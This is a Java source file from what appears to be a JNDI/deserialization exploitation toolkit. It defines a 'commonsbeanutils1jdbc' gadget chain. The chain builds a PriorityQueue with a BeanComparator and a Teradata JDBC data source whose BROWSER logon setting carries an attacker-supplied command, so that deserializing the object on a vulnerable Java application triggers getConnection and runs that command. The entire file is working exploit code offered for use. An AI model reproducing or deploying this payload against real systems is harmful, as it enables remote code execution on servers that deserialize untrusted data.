package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.teradata.jdbc.TeraDataSource;
import org.apache.commons.beanutils.BeanComparator;

import java.math.BigInteger;
import java.util.PriorityQueue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({Authors.FROHOFF})
public class commonsbeanutils1jdbc implements ObjectPayload<Object> {
    public Object getObject(PayloadType type, String... param) throws Exception {

        // create a TeraDataSource object, holding  our JDBC string
        TeraDataSource dataSource = new TeraDataSource();
        dataSource.setBROWSER(param[0]);
        dataSource.setLOGMECH("BROWSER");
        dataSource.setDSName("127.0.0.1");
        dataSource.setDbsPort("10250");

        // mock method name until armed
        final BeanComparator comparator = new BeanComparator("lowestSetBit");
        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        // switch method called by comparator to "getConnection"
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = dataSource;
        queueArray[1] = dataSource;

        return queue;
    }
}
